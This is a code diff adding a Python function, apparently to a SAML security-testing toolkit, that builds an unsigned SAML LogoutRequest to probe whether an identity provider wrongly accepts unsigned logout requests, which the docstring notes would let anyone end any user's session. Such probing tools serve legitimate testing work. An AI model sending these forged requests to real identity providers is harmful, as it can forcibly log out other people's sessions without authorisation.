@@ -490,6 +490,42 @@ def xxe_bounded_expansion(
     ).encode()
 
 
+# ---------- LogoutRequest builder ----------
+
+
+def build_logout_request(
+    *,
+    issuer: str,
+    destination: str,
+    name_id: str,
+    session_index: str | None = None,
+    nameid_format: str = "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress",
+    request_id: str = "_logout-probe",
+    issue_instant: str = "2025-01-01T00:00:00Z",
+) -> bytes:
+    """Emit a bare (unsigned) samlp:LogoutRequest suitable for probing whether
+    an IdP accepts unsigned logout requests. SP-initiated SLO.
+
+    An IdP that accepts this from an arbitrary sender is broken: anyone can
+    terminate any user's IdP session."""
+    root = etree.Element(
+        f"{{{SAMLP_NS}}}LogoutRequest",
+        nsmap={"samlp": SAMLP_NS, "saml": SAML_NS},
+        attrib={
+            "ID": request_id,
+            "Version": "2.0",
+            "IssueInstant": issue_instant,
+            "Destination": destination,
+        },
+    )
+    etree.SubElement(root, f"{{{SAML_NS}}}Issuer").text = issuer
+    nameid = etree.SubElement(root, f"{{{SAML_NS}}}NameID", attrib={"Format": nameid_format})
+    nameid.text = name_id
+    if session_index:
+        etree.SubElement(root, f"{{{SAMLP_NS}}}SessionIndex").text = session_index
+    return _ser(root)
+
+
 # ---------- minimal template for operators with no real Response ----------
 
 
